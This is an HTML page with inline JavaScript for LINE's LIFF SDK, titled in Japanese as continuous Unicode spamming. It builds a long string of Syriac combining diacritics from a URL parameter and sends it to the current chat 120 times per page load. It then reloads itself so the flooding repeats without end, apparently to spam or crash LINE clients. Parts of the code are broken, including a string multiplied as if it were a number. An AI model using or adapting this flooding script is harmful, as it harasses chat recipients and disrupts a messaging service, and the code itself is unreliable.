<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LIFFユニマク</title>
    
</head>
<body>
    <div class="container mt-2">
        <h1>LIFFユニマク 連投中</h1>
        
        <p>log:<span id="err"></span></p>
    </div>
    <script src='https://static.line-scdn.net/liff/edge/2d/sdk.js'></script>
    <script>
        const liffId='1661226722-beANnaeG'
        liff.init({
            liffId: liffId // Use own liffId
        }).then(() => {
                document.getElementById('err').innerHTML= "login"
        })
        .catch((err) => {
                document.getElementById('err').innerHTML= err
        }).then(() => {
            sendUnicode();
        }).then(() => {
            location.reload();
        })

        const sleep = waitTime => new Promise( resolve => setTimeout(resolve, waitTime) );

        const wait = async function( ){await sleep( 300 )};

        function getParam(name, url) {
            if (!url) url = window.location.href;
            name = name.replace(/[\[\]]/g, "\\$&");
            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, " "));
        }

        function sendUnicode(){
            var q = getParam("uni");
            let i = 0;
            var msg = "";
            var unic = ["ܑ","ܰ","ܱ","ܲ","ܳ","ܴ","ܵ","ܶ","ܷ","ܸ","ܹ","ܺ","ܻ","ܼ","ܽ","ܾ","ܿ","݀","݁","݂","݃","݄","݅","݆","݇","݇","݁"];
            var keys = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","x","y","z","?","="];
            for (f in q){
                msg = msg+unic[keys.indexOf(f)]
            }
            msg = msg*(Math.floor(10000/msg.length)+1);
            while (i < 30) {
                i++;
                sendMessage(msg);
                wait();
            }
        }

        function sendMessage(msg){
            liff.sendMessages([
                {
                type: 'text',
                text: msg,
                },
                {
                type: 'text',
                text: msg,
                },
                {
                type: 'text',
                text: msg,
                },
                {
                type: 'text',
                text: msg,
                }
            ]).then(() => {
                document.getElementById('err').innerHTML= ""
                    })
            .catch((err) => {
                document.getElementById('err').innerHTML= err
            })
        }
      
    </script>
</body>
</html>
